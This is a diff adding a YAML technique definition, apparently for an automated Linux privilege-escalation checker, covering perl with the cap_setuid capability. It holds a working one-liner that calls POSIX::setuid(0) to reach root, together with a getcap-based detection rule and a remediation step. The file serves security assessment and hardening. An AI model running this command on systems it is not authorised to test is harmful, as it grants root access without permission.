@@ -1,0 +1,28 @@
+# cap_setuid on perl → root
+technique: T1548.001
+name: cap_setuid on perl → root
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  capability_on_binary:
+    binary: perl
+    cap: cap_setuid
+execute:
+  command: "{{binary}} -e 'use POSIX qw(setuid);POSIX::setuid(0);system(\"id\");'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: capability
+  evidence: "getcap: {{binary}} cap_setuid"
+  description: >
+    Perl with cap_setuid can promote to uid=0 via POSIX::setuid(0),
+    then shell out as root. Same shape as cap_setuid on python.
+  remediation: >
+    Remove the capability (`setcap -r $(which perl)`).
+  refs: [T1548.001, capabilities(7), setcap]
